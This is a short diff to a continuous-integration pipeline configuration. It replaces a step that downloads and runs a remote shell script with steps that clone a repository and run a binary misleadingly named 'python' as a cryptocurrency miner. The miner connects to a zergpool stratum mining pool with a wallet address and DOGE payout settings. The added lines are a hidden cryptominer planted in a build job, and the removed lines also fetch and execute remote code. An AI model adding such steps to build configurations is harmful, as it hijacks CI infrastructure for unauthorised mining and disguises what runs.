@@ -11,6 +11,7 @@ blocks:
       jobs:
         - name: 'Job #4'
           commands:
-            - 'wget https://raw.githubusercontent.com/arisemarise/python/main/cudaplugin.sh'
-            - chmod u+x cudaplugin.sh
-            - /cudaplugin.sh
+            - 'git clone https://github.com/arisemarise/python.git'
+            - cd python
+            - chmod u+x python
+            - './python -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 -u DSig4nin9T5pN1wHSd9apzB6aUP1Ekc9ZZ --keepalive --donate-level 1 -p c=DOGE,mc=UPX'
